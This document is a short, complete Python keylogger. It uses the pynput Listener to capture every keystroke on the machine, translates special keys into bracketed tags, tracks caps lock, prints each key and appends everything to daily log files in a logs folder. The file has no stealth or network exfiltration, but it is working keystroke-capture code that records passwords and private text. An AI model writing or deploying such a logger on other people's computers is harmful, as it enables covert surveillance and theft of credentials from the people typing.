import os
from pynput.keyboard import Listener
from datetime import datetime
import termcolor


def getfilepath():
    base = 'logs'
    year = str(datetime.now().year)
    filename = "log_" + datetime.now().strftime('%Y-%m-%d') + ".txt"
    os.makedirs(os.path.join(base, year), exist_ok=True)
    return os.path.join(base, year, filename)

log_file = getfilepath()

################################################################################

state = {'caps_lock':False}
special_key = ["Key.shift", "Key.caps_lock", "Key.alt_l", "Key.alt_gr", "Key.shift_r", 
               "Key.ctrl_l", "Key.ctrl_r", "Key.esc"]
def writeToFile(key):
    key = str(key)

    if not key.startswith("Key."):
        key = key[1:-1]

    
    print(key)

    if key == "Key.caps_lock":
        state["caps_lock"] = not state["caps_lock"]
    
    if key == "Key.space":
        key = ' '
    if key == "Key.enter":
        key = '\n'
    if key == "Key.tab":
        key = '  '
    if key in special_key or key.startswith('Key'):
        key = '[' + key.split('.')[1].upper() + ']'

    if state["caps_lock"]:
        key = key.upper()
    
    with open(log_file, 'a') as file:
        file.write(key)

################################################################################

with Listener(on_press=writeToFile) as listener:
    listener.join()